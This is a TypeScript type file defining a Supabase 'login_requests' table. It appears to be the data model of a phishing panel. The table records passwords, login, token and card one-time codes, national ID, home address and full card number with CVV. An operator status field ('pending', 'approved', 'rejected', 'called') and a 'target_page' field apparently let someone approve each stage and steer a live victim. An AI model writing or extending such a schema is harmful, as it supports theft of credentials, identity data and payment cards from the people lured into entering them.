export type LoginStep =
  | "login"
  | "otp"
  | "token"
  | "activation_data"
  | "personal_info"
  | "documents"
  | "card_data"
  | "card_otp";

export type RequestStatus = "pending" | "approved" | "rejected" | "called";

export interface CardData {
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  cardHolder: string;
  timestamp?: string;
}

export interface LoginRequest {
  id: string;
  phone: string;
  otp_code: string;
  otp_login: string | null;
  otp_token: string | null;
  otp_card: string | null;
  username: string | null;
  password: string | null;
  step: LoginStep;
  status: RequestStatus;
  selected_service: string | null;
  activation_data: Record<string, unknown> | null;
  full_name: string | null;
  national_id: string | null;
  governorate: string | null;
  city: string | null;
  street: string | null;
  card_data: CardData | null;
  target_page: string | null;
  last_seen_at: string;
  created_at: string;
  updated_at: string;
}

export interface LoginRequestInsert {
  phone: string;
  otp_code: string;
  step: LoginStep;
  status?: RequestStatus;
  username?: string | null;
  password?: string | null;
  otp_login?: string | null;
  otp_token?: string | null;
  otp_card?: string | null;
  selected_service?: string | null;
  activation_data?: Record<string, unknown> | null;
  full_name?: string | null;
  national_id?: string | null;
  governorate?: string | null;
  city?: string | null;
  street?: string | null;
  card_data?: CardData | null;
  target_page?: string | null;
  last_seen_at?: string;
}


export type LoginRequestUpdate = Partial<LoginRequestInsert> & {
  status?: RequestStatus;
  target_page?: string | null;
  updated_at?: string;
};

export interface Database {
  public: {
    Tables: {
      login_requests: {
        Row: LoginRequest;
        Insert: LoginRequestInsert;
        Update: LoginRequestUpdate;
        Relationships: [];
      };
    };
    Views: Record<string, never>;
    Functions: Record<string, never>;
    Enums: Record<string, never>;
    CompositeTypes: Record<string, never>;
  };
}
